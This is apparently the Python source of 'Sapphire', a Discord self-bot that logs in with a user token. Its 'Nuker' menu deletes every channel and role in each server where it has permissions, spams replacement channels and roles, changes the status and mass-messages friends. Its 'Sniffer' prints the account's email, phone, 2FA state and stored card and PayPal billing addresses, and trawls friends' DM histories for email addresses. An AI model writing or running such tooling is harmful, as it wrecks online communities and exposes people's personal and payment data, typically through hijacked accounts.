#                         _                  
#                        ( )    _            
#   ___   _ _ _ _   _ _  | |__ (_)_ __   __  
# /  __)/ _  )  _ \(  _ \|  _  \ |  __)/ __ \
# \__  \ (_| | (_) ) (_) ) | | | | |  (  ___/
# (____/\__ _)  __/|  __/(_) (_)_)_)   \____)
#            | |   | |                       
#            (_)   (_)                        

 
# Developed by Chasa#0001

# I DO NOT HELD ACCOUNTABLE FOR WHAT YOU DO WITH THIS BOT.
# SELFBOTTING IS AGAINST DISCORD'S TOS, ONLY USE IT WISLY.

# If you are downloading this from somewhere other than github.com/itschasa then beware, I have no control on what other people have put into this file, including malware.

# Feel free to make forks of this project. However, follow these guidelines:
# 1. Don't add malware to this project, most people don't want malware suprisingly.
# 2. Give some credit, don't claim that you 100% made this.



print(r"""



















                        _                  
                       ( )    _            
  ___   _ _ _ _   _ _  | |__ (_)_ __   __  
/  __)/ _  )  _ \(  _ \|  _  \ |  __)/ __ \
\__  \ (_| | (_) ) (_) ) | | | | |  (  ___/
(____/\__ _)  __/|  __/(_) (_)_)_)   \____)
           | |   | |                       
           (_)   (_)                        
                                   

Developed by Chasa#0001

I DO NOT HELD ACCOUNTABLE FOR WHAT YOU DO WITH THIS BOT.
SELFBOTTING IS AGAINST DISCORD'S TOS, ONLY USE IT WISLY.

If you are downloading this from somewhere other than github.com/itschasa then beware, I have no control on what other people have put into this file, including malware.

""")

# -------
# Modules
# -------
import sys
import os

modules = ["time", "discord.py", "json", "inputimeout", "colorama", "os", "re", "requests"]
try:
    import time
    import discord
    from discord.ext import commands
    import json
    from inputimeout import inputimeout, TimeoutOccurred
    from colorama import Fore, Back, Style
    import colorama
    import os
    import re
    import requests

except:
    print(f"[!] Failed to load dependencies. Installing now...")
    for package in modules:
        try:
            os.system(f"{sys.executable} -m pip install {package}")
        except:
            pass
        else:
            print(f"[/] Installed {package}.")
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    import time
    import discord
    from discord.ext import commands
    import json
    from inputimeout import inputimeout, TimeoutOccurred
    from colorama import Fore, Back, Style
    import colorama
    import os
    import re
    import requests

# --------
# Start-up
# --------

colorama.init(autoreset=True) # load colorama
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(self_bot=True, command_prefix="-!", help_command=None, intents=intents) # bot var
TOKEN = None
CLEAR = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"


# -------
# Tokens
# -------

while True:
    print(f"{Fore.CYAN}[?] Enter Token:")
    TOKEN = input()
    headers = { 
            "Content-Type": "application/json", 
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Authorization": TOKEN
        }
    try:
        req = requests.get("https://discord.com/api/users/@me", headers=headers)
        if req.status_code == 200:
            tokenData = req.json()
            print(f"{Fore.GREEN}[+] Logged in as {tokenData['username']}#{tokenData['discriminator']}.")
            break
        else:
            print(f"{Fore.YELLOW}[!] Invalid Token, try again.")
    except Exception as e:
        pass

def getData(data):
    try:
        return tokenData[data]
    except:
        return "None"

# -----------
# Config Func
# -----------

print(f"{Fore.CYAN}[>] Loading Config...")
if True:
    try:
        with open('config.json') as f:
            config = json.load(f)
        
        print(f"{Fore.GREEN}[+] Loaded Config!")
    except Exception as e:
        print(f"{Fore.RED}[!] Couldn't find config.json. Creating now...")
        autoConfig = r'''{ 
    "NUKER-SETTINGS": "TO GET HELP GO TO CONFIG SETTINGS",
    "nuker-guilds-change-name" : "nuuked xxxd",
    "nuker-channels-delete" : "true",
    "nuker-channels-create-amount" : "25",
    "nuker-channels-create-name" : "nukedd-ez",
    "nuker-channels-create-message" : "nukedd ez",
    "nuker-roles-delete" : "true",
    "nuker-roles-create-amount" : "10",
    "nuker-roles-create-name" : "nukedd-ez",
    "nuker-no-perms-message" : "false",
    "nuker-user-status" : "nukedd-ez",
    "nuker-dm-amount" : "5",
    "nuker-dm-message" : "account nukkedd ezzzz",
    "nuker-sniffer-enabled" : "true",
    "SNIFFER-SETTINGS" : "TO GET HELP GO TO CONFIG SETTINGS",
    "sniff-personal" : "true",
    "sniff-friends" : "true",
    "sniff-admin-guilds" : "true",
    "sniff-find-emails-dms" : "true"
}'''

        with open("config.json", "w") as f:
            f.write(autoConfig)
        
        with open('config.json') as f:
            config = json.load(f)
        
        print(f"{Fore.GREEN}[+] Loaded Config!")

def reloadConfig():
    print(f"{Fore.CYAN}[>] Loading Config...")
    try:
        with open('config.json') as f:
            config = json.load(f)
        
        print(f"{Fore.GREEN}[+] Loaded Config!")
        return config
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Config Failed to Load. Reusing old config.")
        return config
        

# -------  
# Self-Bot 
# -------  

print(f"{Fore.GREEN}[>] Loading Self-Bot...")

@bot.event
async def on_ready():
    while True:
        print(f"""{CLEAR}{Fore.MAGENTA}
                                        _                                  
                                       ( )    _                            
                  ___   _ _ _ _   _ _  | |__ (_)_ __   __                  
                /  __)/ _  )  _ \(  _ \|  _  \ |  __)/ __ \                
                \__  \ (_| | (_) ) (_) ) | | | | |  (  ___/                
                (____/\__ _)  __/|  __/(_) (_)_)_)   \____)                
                           | |   | |                                       
                           (_)   (_)                                                      
{Fore.WHITE}                                                                           
                          ---=== Main Menu ===---                          
                                 1 - Nuker                                 
                                2 - Sniffer                                                         
                           reload - Reload Config                           

        """)
        reply = input()
        if reply == "1":
            print(CLEAR)
            try:
                print(f"""
[>] Config Loaded:
-- Guilds --
    Change Name: {config["nuker-guilds-change-name"]}
    - Channels -
        Delete Channels: {config["nuker-channels-delete"]}
        Create Channel Amount: {config["nuker-channels-create-amount"]}
        Create Channel Name: {config["nuker-channels-create-name"]}
    - Roles -
        Delete Roles: {config["nuker-roles-delete"]}
        Create Roles Amount: {config["nuker-roles-create-amount"]}
        Create Roles Name: {config["nuker-roles-create-name"]}
    - If No Perms -
        Message Content: {config["nuker-no-perms-message"]}

-- User --
    Status: {config["nuker-user-status"]}
    - DMs -
        DM Amount: {config["nuker-dm-amount"]}
        DM Message: {config["nuker-dm-message"]}
    - Sniffer -
        Enabled: {config["nuker-sniffer-enabled"]}
                """)        
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Invalid Config. Create config again. Press ENTER to Main Menu.")
                print(e)
                input()
            else:
                print(f"{Fore.YELLOW}[?] Does everything look ok? (y/n)\n")
                config_ok = input()
                if config_ok.lower() == "n":
                    print(f"{Fore.CYAN}[>] Going to Main Menu.")
                    print(CLEAR)
                elif config_ok.lower() == "y":
                    for guild in bot.guilds:
                        perms = guild.me.guild_permissions
                        # channels part
                        print(f"\n------------------------ {guild.name} ------------------------")
                        if perms.manage_channels:
                            if config["nuker-channels-delete"].lower() == "true":
                                for channel in guild.channels:
                                    try:
                                        await channel.delete()
                                        print(f"{Fore.GREEN}[+] CHANNELS: Deleted channel {channel.name} in {guild.name}.")
                                    except:
                                        print(f"{Fore.YELLOW}[-] CHANNELS: Couldn't delete channel {channel.name} in {guild.name}.")
                            else:
                                print(f"{Fore.YELLOW}[>] Skipped delete channels (config).")
                            if config["nuker-channels-create-amount"] != "0":
                                for x in range(int(config["nuker-channels-create-amount"])):
                                    try:
                                        newChannel = await guild.create_text_channel(name=config["nuker-channels-create-name"])
                                        print(f"{Fore.GREEN}[+] CHANNELS: Created channel in {guild.name}.")
                                    except:
                                        print(f"{Fore.YELLOW}[-] CHANNELS: Couldn't create channel in {guild.name}.")
                            else:
                                print(f"{Fore.YELLOW}[>] Skipped create channels (config).")
                        else:
                            print(f"{Fore.YELLOW}[-] CHANNELS: No perms in {guild.name}.")
                        # roles part
                        print("----------------------------")
                        if perms.manage_roles:
                            if config["nuker-roles-delete"].lower() == "true":
                                for role in guild.roles:
                                    try:
                                        await role.delete()
                                        print(f"{Fore.GREEN}[+] ROLES: Deleted role in {guild.name}.")
                                    except:
                                        print(f"{Fore.YELLOW}[-] ROLES: Couldn't delete role in {guild.name}.")
                            elif config["nuker-roles-create-amount"] != "0":
                                for x in range(int(config["nuker-roles-create-amount"])):
                                    try:
                                        newChannel = await guild.create_role(name=config["nuker-roles-create-name"])
                                        print(f"{Fore.GREEN}[+] ROLES: Created role in {guild.name}.")
                                    except:
                                        print(f"{Fore.YELLOW}[-] ROLES: Couldn't create role in {guild.name}.")
                            else:
                                print(f"{Fore.YELLOW}[>] Skipped Roles (config).")
                        else:
                            print(f"{Fore.YELLOW}[-] ROLES: No perms in {guild.name}.")
                        # no perms part
                        print("----------------------------")
                        if config["nuker-no-perms-message"] == "false" or config[nuker-no-perms-message] == "none":
                            print(f"{Fore.YELLOW}[>] NO-PERMS: Skipped No Perms Messaging. (config)")
                        else:
                            for channel in guild.channels:
                                try:
                                    await channel.send(config["nuker-no-perms-message"])
                                    print(f"{Fore.GREEN}[+] NO-PERMS: Sent Message to {channel.name} in {guild.name}.")
                                except:
                                    print(f"{Fore.YELLOW}[-] NO-PERMS: Failed to send message to {channel.name} in {guild.name}.")


                    # status
                    print("----------------------------")
                    if config["nuker-user-status"] == "none" or config["nuker-user-status"] == "false":
                        print(f"{Fore.YELLOW}[>] Skipped Status. (config)")
                    else:
                        await bot.change_presence(activity=discord.Game(name=config["nuker-user-status"]))
                        print(f"{Fore.GREEN}[+] STATUS: Changed Status.")
                    # dms
                    print("----------------------------")
                    if config["nuker-dm-amount"] != "0":
                        headers = { 
                            "Content-Type": "application/json", 
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
                            "Authorization": TOKEN
                        }
                        try:
                            req = requests.get("https://discord.com/api/users/@me/relationships", headers=headers)
                            relationshipsData = req.json()
                            for user in relationshipsData:
                                if user["type"] == 1:
                                    userClass = await bot.fetch_user(int(user["id"]))
                                    try:
                                        await userClass.send(config["nuker-dm-message"])
                                        print(f"{Fore.GREEN}[+] DMS: Sent Message to {userClass.name}.")
                                    except:
                                        print(f"{Fore.YELLOW}[-] DMS: Couldn't send message to {userClass.name}.")
                        except Exception as e:
                            print(f"{Fore.YELLOW}[-] DMS: Couldn't get relationships on account.")
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped DMs (config).")
                    # sniffer
                    print("----------------------------")
                    if config["nuker-sniffer-enabled"].lower() == "true":
                        print(f"{Fore.CYAN}[/] SNIFF: Sniffing User...")
                        try:
                            if tokenData["premium_type"] == 1:
                                nitro = "Nitro Classic"
                            else:
                                nitro = "Nitro Boost"
                        except:
                            nitro = "None"
                        headers = { 
                            "Content-Type": "application/json", 
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
                            "Authorization": TOKEN
                            }
                        try:
                            req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
                            if req.status_code == 200:
                                paymentData = req.text
                            else:
                                paymentData = "None"

                            print(f""" 
{Fore.GREEN}[+] Sniffed User Data:
- Username: {tokenData["username"]}#{tokenData["discriminator"]}
- UserID: {tokenData["id"]}
- Email: {tokenData["email"]}
- Nitro Type: {nitro}
- Phone: {tokenData["phone"]}
- Secured (verified): {tokenData["verified"]}
- 2FA: {tokenData["mfa_enabled"]}
- NSFW: {tokenData["nsfw_allowed"]}
- Avatar: https://cdn.discordapp.com/avatars/{tokenData["id"]}/{tokenData["avatar"]}.png
- Billing Info: {paymentData}
 """)
                            print(f"{Fore.CYAN}[>] Press ENTER to Main Menu.")
                            input()
                        except:
                            print(f"{Fore.YELLOW}[!] SNIFF: Failed to Sniff. (couldn't get info)")
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped Sniffer. (config)")
        
        
        # elif here
        elif reply == "2":
            print(CLEAR)                             
            try:
                print(f"""
[>] Config Loaded:
Sniff Personal: {config["sniff-personal"]}
Sniff Friends: {config["sniff-friends"]}
Sniff Admin Guilds: {config["sniff-admin-guilds"]}
Sniff Find Emails: {config["sniff-find-emails-dms"]}
                """)        
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Invalid Config. Create config again. Press ENTER to Main Menu.")
                print(e)
                input()
            else:
                print(f"{Fore.YELLOW}[?] Does everything look ok? (y/n)\n")
                config_ok = input()
                if config_ok.lower() == "n":
                    print(f"{Fore.CYAN}[>] Going to Main Menu.")
                    print(CLEAR)
                elif config_ok.lower() == "y":
                    print("\n")
                    print("----------------------------")
                    if config["sniff-personal"].lower() == "true":
                        try:
                            if tokenData["premium_type"] == 1:
                                sniff_nitro = "Nitro Classic"
                            elif tokenData["premium_type"] == 2:
                                sniff_nitro = "Nitro Boost"
                            else:
                                sniff_nitro = "None"
                        except:
                            sniff_nitro = "None"
                        headers = { 
                            "Content-Type": "application/json", 
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
                            "Authorization": TOKEN
                            }
                        try:
                            req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
                            if req.status_code == 200:
                                paymentData = req.json()
                            else:
                                paymentData = "Couldn't fetch."
                        except:
                            paymentData = "Couldn't fetch."
                        print(f"""
{Fore.GREEN}[+] Sniffed Personal:
- ID: {getData("id")}
- Name: {getData("username")}#{getData("discriminator")}
- Avatar: https://cdn.discordapp.com/avatars/{getData("id")}/{getData("avatar")}.png/jpg/gif
- Nitro: {sniff_nitro}
- 2FA: {getData("mfa_enabled")}
- Email: {getData("email")} (verified: {getData("verified")})
- Phone: {getData("phone")}
- Locale: {getData("locale")}
- NSFW: {getData("nsfw_allowed")}

- Payment Data (if none):""")
                        if paymentData == "Couldn't fetch.":
                            print(paymentData)
                        else:
                            for payment in paymentData:
                                if payment["type"] == 1:
                                    print(f"""{Fore.GREEN}Type: Credit/Debit Card
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Default: {payment["default"]}
Brand: {payment["brand"]}
Last 4 Digits: {payment["last_4"]}
Expire Date: {payment['expires_month']}/{payment['expires_year']}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
""")
                                elif payment["type"] == 2:
                                    print(f"""{Fore.GREEN}Type: PayPal
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Email: {payment["email"]}
Default: {payment["default"]}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
""")
                                else:
                                    print(f"{Fore.GREEN}[+++] UNIQUE PAYMENT TYPE!")
                                    print(payment)
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped Personal (config).")
                    # relationships
                    print("----------------------------")
                    relationshipsData = None
                    if config["sniff-friends"].lower() == "true": 
                        try:
                            req = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
                            if req.status_code == 200:
                                relationshipsData = req.json()
                            else:
                                relationshipsData = None
                        except:
                            relationshipsData = None
                        if relationshipsData != None:
                            print("Green = Friend | Yellow = Blocked | Cyan = Incoming/Outgoing")
                            print("Goes in Order of Account Creation, First is the oldest.")
                            for user1 in relationshipsData:
                                if user1["type"] == 1:
                                    print(f"{Fore.GREEN}[F] {user1['user']['username']}#{user1['user']['discriminator']} ID: {user1['user']['id']}")
                                elif user1["type"] == 2:
                                    print(f"{Fore.YELLOW}[B] {user1['user']['username']}#{user1['user']['discriminator']} ID: {user1['user']['id']}")
                                elif user1["type"] == 3:
                                    print(f"{Fore.CYAN}[I] {user1['user']['username']}#{user1['user']['discriminator']} ID: {user1['user']['id']}")
                                elif user1["type"] == 4:
                                    print(f"{Fore.CYAN}[O] {user1['user']['username']}#{user1['user']['discriminator']} ID: {user1['user']['id']}")
                                else:
                                    print(f"{Fore.RED}[!] Incorrect Type.")
                        else:
                            print(f"{Fore.YELLOW}[!] Couldn't get relationship data.")    
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped Friends (config).")
                    # guilds
                    print("----------------------------")
                    if config["sniff-admin-guilds"].lower() == "true": 
                        print("Green = Admin Perms | Yellow = No Admin (could have kick/ban/manage etc)")
                        for guild in bot.guilds:
                            if guild.me != None:
                                if guild.me.guild_permissions.administrator == True:
                                    print(f"{Fore.GREEN}[+] {guild.name} / {guild.me.guild_permissions}")
                                else:
                                    print(f"{Fore.YELLOW}[+] {guild.name} / {guild.me.guild_permissions}")
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped Admin Guilds (config).")
                    # find emails
                    print("----------------------------")
                    if config["sniff-find-emails-dms"].lower() == "true":
                        print(f"{Fore.YELLOW}[!] Searching can take some time, depending on the amount of friends and the amount of dms they have.")
                        if relationshipsData == None:
                            try:
                                req = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
                                if req.status_code == 200:
                                    relationshipsData = req.json()
                                else:
                                    relationshipsData = None
                            except:
                                relationshipsData = None
                        if relationshipsData == None:
                            print(f"{Fore.YELLOW}[!] Couldn't get relationships data.")
                        else:
                            emails = ["@gmail.com","@yahoo.com","@hotmail.com","@aol.com","@hotmail.co.uk","@hotmail.fr","@msn.com","@yahoo.fr","@wanadoo.fr","@orange.fr","@comcast.net","@yahoo.co.uk","@yahoo.com.br","@yahoo.co.in","@live.com","@rediffmail.com","@free.fr","@gmx.de","@web.de","@yandex.ru","@ymail.com","@libero.it","@outlook.com","@uol.com.br","@bol.com.br","@mail.ru","@cox.net","@hotmail.it","@sbcglobal.net","@sfr.fr","@live.fr","@verizon.net","@live.co.uk","@googlemail.com","@yahoo.es","@ig.com.br","@live.nl","@bigpond.com","@terra.com.br","@yahoo.it","@neuf.fr","@yahoo.de","@alice.it","@rocketmail.com","@att.net","@laposte.net","@facebook.com","@bellsouth.net","@yahoo.in","@hotmail.es","@charter.net","@yahoo.ca","@yahoo.com.au","@rambler.ru","@hotmail.de","@tiscali.it","@shaw.ca","@yahoo.co.jp","@sky.com","@earthlink.net","@optonline.net","@freenet.de","@t-online.de","@aliceadsl.fr","@virgilio.it","@home.nl","@qq.com","@telenet.be","@me.com","@yahoo.com.ar","@tiscali.co.uk","@yahoo.com.mx","@voila.fr","@gmx.net","@mail.com","@planet.nl","@tin.it","@live.it","@ntlworld.com","@arcor.de","@yahoo.co.id","@frontiernet.net","@hetnet.nl","@live.com.au","@yahoo.com.sg","@zonnet.nl","@club-internet.fr","@juno.com","@optusnet.com.au","@blueyonder.co.uk","@bluewin.ch","@skynet.be","@sympatico.ca","@windstream.net","@mac.com","@centurytel.net","@chello.nl","@live.ca","@aim.com","@bigpond.net.au"]
                            for friend in relationshipsData:
                                try:
                                    friend_user = bot.get_user(int(friend["id"]))
                                    if friend == None:
                                        print(f"{Fore.YELLOW}[-] Failed to get {friend['user']['username']}#{friend['user']['discriminator']} data.")
                                    else:
                                        print(f"{Fore.YELLOW}[>] Searching in {friend['user']['username']}#{friend['user']['discriminator']}.")
                                        async for message in friend_user.dm_channel.history(limit=None):
                                            for email in emails:
                                                if email in message.content:
                                                    print(f"{Fore.GREEN}[+] {message.content} | msgID: {message.id} | Author: {message.author.name}#{message.author.discriminator}")
                                except:
                                    print(f"{Fore.YELLOW}[-] Couldn't fetch {friend['user']['username']}#{friend['user']['discriminator']}.")
                    else:
                        print(f"{Fore.YELLOW}[>] Skipped Finding Emails (config).")
                    
                    print(f"{Fore.GREEN}[>] Task Completed! Press ENTER to Main Menu.")
                    input()
        elif reply == "reload":
            config = reloadConfig()
            print(f"{Fore.CYAN}[>] Press ENTER to Main Menu.")
            input()
        else:
            print(f"{Fore.YELLOW}[!] Incorrect Option. Press ENTER to Main Menu.")
            input()



bot.run(TOKEN, bot=False)
